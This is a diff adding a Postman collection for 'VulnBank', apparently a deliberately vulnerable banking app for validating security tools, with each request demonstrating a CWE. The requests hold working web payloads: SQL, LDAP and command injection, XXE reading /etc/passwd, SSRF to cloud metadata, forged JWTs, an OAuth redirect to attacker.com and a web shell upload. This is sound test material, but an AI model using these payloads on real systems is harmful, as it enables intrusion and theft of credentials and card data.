@@ -1,0 +1,677 @@
+{
+  "info": {
+    "name": "VulnBank — Vulnerability Test Suite",
+    "_postman_id": "vulnbank-v6-collection",
+    "description": "VulnBank v6.0.0 — Deliberately vulnerable banking app for security tool validation. Each request demonstrates a specific CVE/CWE vulnerability.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "base_url",
+      "value": "http://localhost:5000",
+      "type": "string"
+    },
+    {
+      "key": "token",
+      "value": "",
+      "type": "string"
+    }
+  ],
+  "item": [
+    {
+      "name": "Auth",
+      "item": [
+        {
+          "name": "SQLi Login Bypass",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/login", "host": ["{{base_url}}"], "path": ["login"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\": \"' OR '1'='1' --\", \"password\": \"anything\"}"
+            },
+            "description": "CWE-89: SQL Injection in login. Username payload (' OR '1'='1' --) bypasses authentication. Observe: 200 OK with valid session token."
+          }
+        },
+        {
+          "name": "Login Valid User",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/login", "host": ["{{base_url}}"], "path": ["login"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\": \"alice\", \"password\": \"alice123\"}"
+            },
+            "description": "Normal login to get session cookie for subsequent requests."
+          }
+        },
+        {
+          "name": "SAML XXE via auth",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/xml"}],
+            "url": {"raw": "{{base_url}}/api/auth/saml", "host": ["{{base_url}}"], "path": ["api", "auth", "saml"]},
+            "body": {
+              "mode": "raw",
+              "raw": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><SAMLResponse><Assertion>&xxe;</Assertion></SAMLResponse>"
+            },
+            "description": "CWE-611: XXE injection via SAML endpoint. Payload reads /etc/passwd via XML external entity. Observe: file contents reflected in response."
+          }
+        }
+      ]
+    },
+    {
+      "name": "SQL Injection",
+      "item": [
+        {
+          "name": "SQLi User Profile",
+          "request": {
+            "method": "GET",
+            "url": {"raw": "{{base_url}}/profile/' UNION SELECT 1,username,password,4,5,6 FROM users--", "host": ["{{base_url}}"], "path": ["profile", "' UNION SELECT 1,username,password,4,5,6 FROM users--"]},
+            "description": "CWE-89: UNION-based SQL injection in profile endpoint. Extracts usernames and password hashes from users table. Observe: user data in response."
+          }
+        },
+        {
+          "name": "SQLi Search XSS",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/search?q=<script>alert(1)</script>",
+              "host": ["{{base_url}}"],
+              "path": ["search"],
+              "query": [{"key": "q", "value": "<script>alert(1)</script>"}]
+            },
+            "description": "CWE-79 + CWE-89: Reflected XSS and SQLi in search endpoint. Payload executes JavaScript in victim browser. Observe: script tag reflected unescaped."
+          }
+        },
+        {
+          "name": "SQLi Transaction IDOR",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/transactions/1' OR '1'='1",
+              "host": ["{{base_url}}"],
+              "path": ["api", "transactions", "1' OR '1'='1"]
+            },
+            "description": "CWE-89 + CWE-285: SQLi and IDOR in transaction lookup. Any transaction accessible without ownership check. Observe: transaction data returned."
+          }
+        },
+        {
+          "name": "Bulk Transfer Race Condition",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/transfer/bulk", "host": ["{{base_url}}"], "path": ["api", "transfer", "bulk"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"transfers\": [{\"to\": \"bob\", \"amount\": 100}, {\"to\": \"charlie\", \"amount\": 100}]}"
+            },
+            "description": "CWE-362: Race condition/TOCTOU in bulk transfer. Balance checked once then debited N times. Run concurrent requests to overdraw account."
+          }
+        },
+        {
+          "name": "Negative Transfer (Business Logic)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/transfer/negative", "host": ["{{base_url}}"], "path": ["api", "transfer", "negative"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"to\": \"alice\", \"amount\": -9999}"
+            },
+            "description": "CWE-840: Business logic flaw — negative amount steals funds from recipient. Observe: recipient balance decreases, sender gains."
+          }
+        }
+      ]
+    },
+    {
+      "name": "OAuth",
+      "item": [
+        {
+          "name": "OAuth Open Redirect (redirect_uri)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/oauth/authorize?client_id=evil&redirect_uri=https://attacker.com/steal&response_type=code",
+              "host": ["{{base_url}}"],
+              "path": ["api", "oauth", "authorize"],
+              "query": [
+                {"key": "client_id", "value": "evil"},
+                {"key": "redirect_uri", "value": "https://attacker.com/steal"},
+                {"key": "response_type", "value": "code"}
+              ]
+            },
+            "description": "CWE-601: Open redirect via redirect_uri. redirect_uri not validated against whitelist — auth code sent to attacker domain. Observe: 302 redirect to attacker.com with code param."
+          }
+        },
+        {
+          "name": "OAuth SSRF via token_endpoint",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/oauth/callback?code=test123&token_endpoint=http://169.254.169.254/latest/meta-data/",
+              "host": ["{{base_url}}"],
+              "path": ["api", "oauth", "callback"],
+              "query": [
+                {"key": "code", "value": "test123"},
+                {"key": "token_endpoint", "value": "http://169.254.169.254/latest/meta-data/"}
+              ]
+            },
+            "description": "CWE-918: SSRF via token_endpoint parameter. Server fetches attacker-controlled URL — can reach internal metadata endpoints. Observe: AWS metadata or internal service response."
+          }
+        },
+        {
+          "name": "OAuth Token Exchange (Hardcoded Secret)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/x-www-form-urlencoded"}],
+            "url": {"raw": "{{base_url}}/api/oauth/token", "host": ["{{base_url}}"], "path": ["api", "oauth", "token"]},
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {"key": "client_id", "value": "test"},
+                {"key": "client_secret", "value": "oauth-client-secret-2024"},
+                {"key": "code", "value": "anycode"},
+                {"key": "grant_type", "value": "authorization_code"}
+              ]
+            },
+            "description": "CWE-798: Hardcoded client_secret 'oauth-client-secret-2024'. CWE-330: Weak token from random.randint. Observe: access_token issued with predictable integer value."
+          }
+        },
+        {
+          "name": "OAuth SQLi in client_id",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/x-www-form-urlencoded"}],
+            "url": {"raw": "{{base_url}}/api/oauth/token", "host": ["{{base_url}}"], "path": ["api", "oauth", "token"]},
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {"key": "client_id", "value": "' OR '1'='1"},
+                {"key": "client_secret", "value": "oauth-client-secret-2024"},
+                {"key": "code", "value": "' OR '1'='1"},
+                {"key": "grant_type", "value": "authorization_code"}
+              ]
+            },
+            "description": "CWE-89: SQLi in client_id and code params during token exchange. Observe: SQL error or token issued without valid code."
+          }
+        },
+        {
+          "name": "OAuth Revoke Any Token (No Auth)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/x-www-form-urlencoded"}],
+            "url": {"raw": "{{base_url}}/api/oauth/revoke", "host": ["{{base_url}}"], "path": ["api", "oauth", "revoke"]},
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [{"key": "token", "value": "victim_token_here"}]
+            },
+            "description": "CWE-285: No authentication required to revoke any token. Any unauthenticated attacker can revoke other users' tokens. Observe: 200 OK, token revoked."
+          }
+        }
+      ]
+    },
+    {
+      "name": "MFA Bypass",
+      "item": [
+        {
+          "name": "MFA Master Bypass Code",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/mfa/verify", "host": ["{{base_url}}"], "path": ["api", "mfa", "verify"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"user_id\": \"1\", \"code\": \"000000\"}"
+            },
+            "description": "CWE-798: Hardcoded master bypass code '000000'. Any user_id + code '000000' bypasses MFA entirely. Observe: {'status': 'verified', 'method': 'master_bypass'}."
+          }
+        },
+        {
+          "name": "MFA Brute Force (No Lockout)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/mfa/verify", "host": ["{{base_url}}"], "path": ["api", "mfa", "verify"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"user_id\": \"1\", \"code\": \"123456\"}"
+            },
+            "description": "CWE-307: No brute-force lockout. Send unlimited attempts with different 6-digit codes. Run in a loop 0-999999. Observe: never locked out."
+          }
+        },
+        {
+          "name": "MFA Backup Codes (No Auth)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/mfa/backup-codes?user_id=1",
+              "host": ["{{base_url}}"],
+              "path": ["api", "mfa", "backup-codes"],
+              "query": [{"key": "user_id", "value": "1"}]
+            },
+            "description": "CWE-285: No authentication required to retrieve backup codes. Any unauthenticated user can get backup codes for any user_id. Observe: 8 backup codes returned."
+          }
+        },
+        {
+          "name": "MFA Disable (No Password)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/mfa/disable", "host": ["{{base_url}}"], "path": ["api", "mfa", "disable"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"user_id\": \"1\"}"
+            },
+            "description": "CWE-285: No password re-verification to disable MFA. Any request with a user_id disables that user's MFA. CWE-89: SQLi in user_id. Observe: MFA disabled without authentication."
+          }
+        },
+        {
+          "name": "MFA Setup (Weak Secret)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/mfa/setup", "host": ["{{base_url}}"], "path": ["api", "mfa", "setup"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"user_id\": \"1\"}"
+            },
+            "description": "CWE-330: TOTP secret generated with random.random() — not cryptographically secure. CWE-312: Secret stored in plaintext. Observe: totp_secret returned in response body."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Password Reset",
+      "item": [
+        {
+          "name": "Host Header Injection (Reset Poisoning)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "Host", "value": "attacker.com"}
+            ],
+            "url": {"raw": "{{base_url}}/api/reset/request", "host": ["{{base_url}}"], "path": ["api", "reset", "request"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"email\": \"alice@vulnbank.com\"}"
+            },
+            "description": "CWE-20: Host header injection — reset URL built from HTTP Host header. Set Host: attacker.com to make reset link point to attacker domain. Observe: debug_reset_url contains attacker.com."
+          }
+        },
+        {
+          "name": "Reset SQLi in Email",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/reset/request", "host": ["{{base_url}}"], "path": ["api", "reset", "request"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"email\": \"' OR '1'='1' --\"}"
+            },
+            "description": "CWE-89: SQLi in email lookup during password reset. Payload matches all users. Observe: reset token generated for injected query result."
+          }
+        },
+        {
+          "name": "Reset Confirm (MD5 Password + Replay)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/reset/confirm", "host": ["{{base_url}}"], "path": ["api", "reset", "confirm"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"token\": \"123456\", \"new_password\": \"hacked123\"}"
+            },
+            "description": "CWE-916: New password hashed with MD5 (no salt). CWE-330: Token never invalidated — replay the same token multiple times. CWE-89: SQLi in token lookup."
+          }
+        },
+        {
+          "name": "Email Enumeration (Timing Oracle)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/reset/validate?email=alice@vulnbank.com",
+              "host": ["{{base_url}}"],
+              "path": ["api", "reset", "validate"],
+              "query": [{"key": "email", "value": "alice@vulnbank.com"}]
+            },
+            "description": "CWE-208: Timing oracle — valid emails get 500ms sleep + different message. Compare response time for valid vs invalid email to enumerate accounts. Observe: 'Email found' message and ~500ms delay for valid email."
+          }
+        }
+      ]
+    },
+    {
+      "name": "GraphQL",
+      "item": [
+        {
+          "name": "GraphQL Introspection (Schema Leak)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/graphql", "host": ["{{base_url}}"], "path": ["api", "graphql"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"{ __schema { types { name fields } } }\"}"
+            },
+            "description": "CWE-200: Introspection enabled in production — full schema including sensitive fields (password, card_number, totp_secret) exposed. Observe: complete schema returned."
+          }
+        },
+        {
+          "name": "GraphQL SQLi + IDOR (User Data)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/graphql", "host": ["{{base_url}}"], "path": ["api", "graphql"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"{ user(id: \\\"1 OR 1=1\\\") { email balance card_number password } }\"}"
+            },
+            "description": "CWE-89 + CWE-285: SQLi via user id field. Resolver executes f'SELECT {fields} FROM users WHERE id={id}'. IDOR — no ownership check. Observe: sensitive user data including card_number and password hash."
+          }
+        },
+        {
+          "name": "GraphQL Batch DoS (No Limit)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/graphql/batch", "host": ["{{base_url}}"], "path": ["api", "graphql", "batch"]},
+            "body": {
+              "mode": "raw",
+              "raw": "[{\"query\": \"{ user(id: \\\"1\\\") { email } }\"}, {\"query\": \"{ user(id: \\\"2\\\") { email } }\"}, {\"query\": \"{ user(id: \\\"3\\\") { email } }\"}, {\"query\": \"{ user(id: \\\"4\\\") { email } }\"}, {\"query\": \"{ user(id: \\\"5\\\") { email } }\"}]"
+            },
+            "description": "CWE-400: No batch size limit — 100+ queries in one request causes DoS. Each query runs independently. Scale the array to 100+ items. Observe: server processes all without limit."
+          }
+        },
+        {
+          "name": "GraphQL Field Injection (card_number)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/graphql", "host": ["{{base_url}}"], "path": ["api", "graphql"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"{ user(id: \\\"2\\\") { email balance card_number totp_secret } }\"}"
+            },
+            "description": "CWE-285: No field-level authorization — any user can query any other user's card_number and totp_secret. Observe: PAN and TOTP secret returned for user id=2."
+          }
+        }
+      ]
+    },
+    {
+      "name": "JWT",
+      "item": [
+        {
+          "name": "JWT Login (Get Token)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/jwt/login", "host": ["{{base_url}}"], "path": ["api", "jwt", "login"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\": \"alice\", \"password\": \"alice123\"}"
+            },
+            "description": "Get a JWT token signed with hardcoded RS256 key for use in subsequent JWT attacks."
+          }
+        },
+        {
+          "name": "JWT Algorithm None Attack",
+          "request": {
+            "method": "GET",
+            "header": [
+              {"key": "Authorization", "value": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."}
+            ],
+            "url": {"raw": "{{base_url}}/api/jwt/profile", "host": ["{{base_url}}"], "path": ["api", "jwt", "profile"]},
+            "description": "CWE-347: JWT 'none' algorithm attack. Header: {alg:'none'}. Payload: {sub:1, username:admin, role:admin}. No signature verification. Observe: admin profile returned without valid signature."
+          }
+        },
+        {
+          "name": "JWT Algorithm Confusion (HS256 with RSA pubkey)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {"key": "Authorization", "value": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.forged_sig"}
+            ],
+            "url": {"raw": "{{base_url}}/api/jwt/profile", "host": ["{{base_url}}"], "path": ["api", "jwt", "profile"]},
+            "description": "CWE-347: Algorithm confusion attack — HS256 token verified against RSA public key as HMAC secret. Sign token with public key (which attacker knows) to forge admin JWT. Observe: profile returned."
+          }
+        },
+        {
+          "name": "JWT kid SQLi",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "Authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IicgT1IgJzEnPScxIn0.eyJzdWIiOiIxIn0.sig"}
+            ],
+            "url": {"raw": "{{base_url}}/api/jwt/refresh", "host": ["{{base_url}}"], "path": ["api", "jwt", "refresh"]},
+            "description": "CWE-89: SQLi via JWT kid header. kid value: ' OR '1'='1 injected into SELECT public_key FROM jwt_keys WHERE kid='{kid}'. Observe: SQL error or arbitrary key returned."
+          }
+        },
+        {
+          "name": "JWT kid SSRF (Remote JWKS)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "Authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS8ifQ.eyJzdWIiOiIxIn0.sig"}
+            ],
+            "url": {"raw": "{{base_url}}/api/jwt/refresh", "host": ["{{base_url}}"], "path": ["api", "jwt", "refresh"]},
+            "description": "CWE-918: SSRF via JWT kid header set to http://169.254.169.254/latest/meta-data/. Server fetches remote key from attacker or internal URL. Observe: SSRF to metadata service."
+          }
+        }
+      ]
+    },
+    {
+      "name": "LDAP",
+      "item": [
+        {
+          "name": "LDAP Injection Login Bypass",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/ldap/login", "host": ["{{base_url}}"], "path": ["api", "ldap", "login"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\": \"*)(&\", \"password\": \"anything\"}"
+            },
+            "description": "CWE-90: LDAP injection. Username '*)(&' collapses AND filter to always-true: (&(objectClass=user)(uid=*)(&)(password=anything)). Observe: authenticated as first user in directory, passwordHash returned."
+          }
+        },
+        {
+          "name": "LDAP Anonymous Search (No Auth)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/ldap/search", "host": ["{{base_url}}"], "path": ["api", "ldap", "search"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"*\", \"attribute\": \"uid\"}"
+            },
+            "description": "CWE-285: No authentication for LDAP search. CWE-200: Returns full entry including passwordHash. Observe: all users with password hashes returned to unauthenticated caller."
+          }
+        },
+        {
+          "name": "LDAP Injection in Search Filter",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/ldap/search", "host": ["{{base_url}}"], "path": ["api", "ldap", "search"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"*)(objectClass=admin\", \"attribute\": \"uid\"}"
+            },
+            "description": "CWE-90: LDAP injection in search filter. Payload '*)(objectClass=admin' bypasses the uid filter to return admin objects. Observe: admin entries including sensitive attributes returned."
+          }
+        },
+        {
+          "name": "LDAP Change Password (MD5)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/ldap/change-password", "host": ["{{base_url}}"], "path": ["api", "ldap", "change-password"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\": \"alice\", \"new_password\": \"hacked\"}"
+            },
+            "description": "CWE-916: Password stored as unsalted MD5. CWE-90: LDAP injection in modify filter. CWE-89: SQLi in audit log. Observe: new MD5 hash returned in plaintext response."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Admin",
+      "item": [
+        {
+          "name": "Admin Command Injection (ping)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/admin/ping?host=127.0.0.1; cat /etc/passwd",
+              "host": ["{{base_url}}"],
+              "path": ["admin", "ping"],
+              "query": [{"key": "host", "value": "127.0.0.1; cat /etc/passwd"}]
+            },
+            "description": "CWE-78: OS command injection in admin ping. Shell=True with unsanitized host param. Payload: '127.0.0.1; cat /etc/passwd'. Observe: /etc/passwd contents in response."
+          }
+        },
+        {
+          "name": "Admin Path Traversal (logs)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/admin/logs?filename=../../etc/passwd",
+              "host": ["{{base_url}}"],
+              "path": ["admin", "logs"],
+              "query": [{"key": "filename", "value": "../../etc/passwd"}]
+            },
+            "description": "CWE-22: Path traversal in admin log viewer. Filename param traverses outside /var/log/. Observe: /etc/passwd contents returned."
+          }
+        },
+        {
+          "name": "Admin RCE (pickle deserialization)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/octet-stream"}],
+            "url": {"raw": "{{base_url}}/api/restore", "host": ["{{base_url}}"], "path": ["api", "restore"]},
+            "body": {
+              "mode": "raw",
+              "raw": "pickled_payload_here"
+            },
+            "description": "CWE-502: Pickle deserialization RCE. POST serialized Python pickle payload to /api/restore. The server calls pickle.loads() on request body. Observe: arbitrary code execution."
+          }
+        },
+        {
+          "name": "Admin SSRF (api/fetch)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+              "host": ["{{base_url}}"],
+              "path": ["api", "fetch"],
+              "query": [{"key": "url", "value": "http://169.254.169.254/latest/meta-data/"}]
+            },
+            "description": "CWE-918: SSRF via /api/fetch endpoint. Server fetches arbitrary URL via urllib.request.urlopen. Observe: AWS instance metadata returned."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Payments",
+      "item": [
+        {
+          "name": "Payments Webhook Pickle RCE",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/octet-stream"}],
+            "url": {"raw": "{{base_url}}/api/payments/webhook", "host": ["{{base_url}}"], "path": ["api", "payments", "webhook"]},
+            "body": {
+              "mode": "raw",
+              "raw": "pickle_payload"
+            },
+            "description": "CWE-502: Pickle deserialization in payments webhook handler. Server calls pickle.loads() on webhook body. Observe: arbitrary code execution from malicious pickle."
+          }
+        },
+        {
+          "name": "Payments SSRF (Payment Gateway)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/payments/process", "host": ["{{base_url}}"], "path": ["api", "payments", "process"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"gateway_url\": \"http://internal-service/admin\", \"amount\": 100}"
+            },
+            "description": "CWE-918: SSRF via payment gateway_url parameter. Server makes server-side request to attacker-controlled URL. Observe: internal service response proxied back."
+          }
+        },
+        {
+          "name": "Payments PAN Storage (Plaintext)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/payments/card/store", "host": ["{{base_url}}"], "path": ["api", "payments", "card", "store"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"card_number\": \"4111111111111111\", \"cvv\": \"123\", \"expiry\": \"12/26\"}"
+            },
+            "description": "CWE-312: PAN and CVV stored in plaintext database columns. PCI DSS Req 3.3.1 violation — CVV must never be stored. Observe: card data inserted without encryption."
+          }
+        }
+      ]
+    },
+    {
+      "name": "File Upload",
+      "item": [
+        {
+          "name": "Unrestricted File Upload (Web Shell)",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {"raw": "{{base_url}}/api/files/upload", "host": ["{{base_url}}"], "path": ["api", "files", "upload"]},
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "file",
+                  "type": "file",
+                  "src": "shell.php",
+                  "description": "Upload a PHP/Python web shell — no extension or MIME type validation"
+                }
+              ]
+            },
+            "description": "CWE-434: Unrestricted file upload. No extension or MIME type check. Upload shell.php or shell.py. Observe: file stored and accessible at /uploads/shell.php."
+          }
+        },
+        {
+          "name": "File Path Traversal Download",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/files/download?filename=../../etc/passwd",
+              "host": ["{{base_url}}"],
+              "path": ["api", "files", "download"],
+              "query": [{"key": "filename", "value": "../../etc/passwd"}]
+            },
+            "description": "CWE-22: Path traversal in file download endpoint. Filename param not sanitized — traverses outside upload directory. Observe: /etc/passwd returned."
+          }
+        },
+        {
+          "name": "File CMDi (delete)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "url": {"raw": "{{base_url}}/api/files/delete", "host": ["{{base_url}}"], "path": ["api", "files", "delete"]},
+            "body": {
+              "mode": "raw",
+              "raw": "{\"filename\": \"test.txt; cat /etc/passwd\"}"
+            },
+            "description": "CWE-78: Command injection in file delete endpoint. Filename passed to shell command without sanitization. Observe: /etc/passwd output in response."
+          }
+        }
+      ]
+    }
+  ]
+}
